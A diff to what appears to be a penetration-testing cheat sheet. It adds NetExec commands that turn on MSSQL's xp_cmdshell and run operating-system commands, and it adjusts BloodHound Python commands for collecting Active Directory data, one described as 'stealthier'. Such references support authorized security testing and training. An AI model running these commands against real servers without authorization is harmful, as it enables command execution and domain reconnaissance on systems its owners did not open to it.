@@ -1765,6 +1765,12 @@ nxc mssql <RHOST> -u <USER> -p <PASS>
 
 # NetExec MSSQL query execution
 nxc mssql <RHOST> -u <USER> -p <PASS> -q "SELECT name FROM master.dbo.sysdatabases"
+
+# NetExec MSSQL enalbe xp_cmdshell
+nxc mssql <RHOST> -u <USER> -p <PASS> -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+
+# NetExec MSSQL command execution
+nxc mssql <RHOST> -u <USER> -p <PASS> -x "whoami"
 ```
 
 ### 15.2 MySQL enumeration
@@ -2024,13 +2030,13 @@ Get-ChildItem -Path "\\<HOSTNAME>\<SHARE>" -Recurse -Include *.txt,*.xml,*.confi
 #### Linux - BloodHound Python
 ```bash
 # Standard auth - full collection
-bloodhound-python -c All -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DNS_IP>
+bloodhound-python -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <DNS_IP>
 
 # Kerberos auth (requires -k and env var)
-bloodhound-python -c All -u <USER> -p '' -k -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DNS_IP>
+bloodhound-python -c All -u <USER> -p '' -k -d <DOMAIN> -ns <DNS_IP>
 
 # DC only - faster and stealthier
-bloodhound-python -c DCOnly -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_HOSTNAME> -ns <DNS_IP>
+bloodhound-python -c DCOnly -u <USER> -p <PASS> -d <DOMAIN> -ns <DNS_IP>
 
 # Specific collection methods
 bloodhound-python -c Group,LocalAdmin,Session,Trusts -u <USER> -p <PASS> -d <DOMAIN> -ns <DNS_IP>
